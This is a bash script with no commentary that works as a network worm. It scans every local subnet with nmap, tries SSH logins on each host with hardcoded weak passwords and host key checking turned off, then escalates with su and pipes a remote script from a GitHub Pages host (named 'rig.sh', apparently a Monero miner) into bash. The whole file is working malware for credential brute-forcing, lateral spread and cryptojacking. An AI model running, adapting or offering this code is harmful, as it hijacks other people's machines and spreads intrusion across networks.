 #!/bin/bash

interfaces=$(ip -o -4 addr show | awk '{print $2, $4}' | grep -v lo)

scan_subnet() {
    local subnet=$1
    local ip
    for ip in $(nmap -sL -n "$subnet" | awk '/Nmap scan report/{print $NF}'); do
        try_ssh "$ip"
    done
}

try_ssh() {
    local ip=$1

   sshpass -p "rnzxor" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no admin@$ip \
    "echo 'rnzxor' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }

    sshpass -p "12345678" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no user@$ip \
    "echo '12345678' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }

}

while read -r interface subnet; do
    scan_subnet "$subnet"
done <<< "$interfaces"
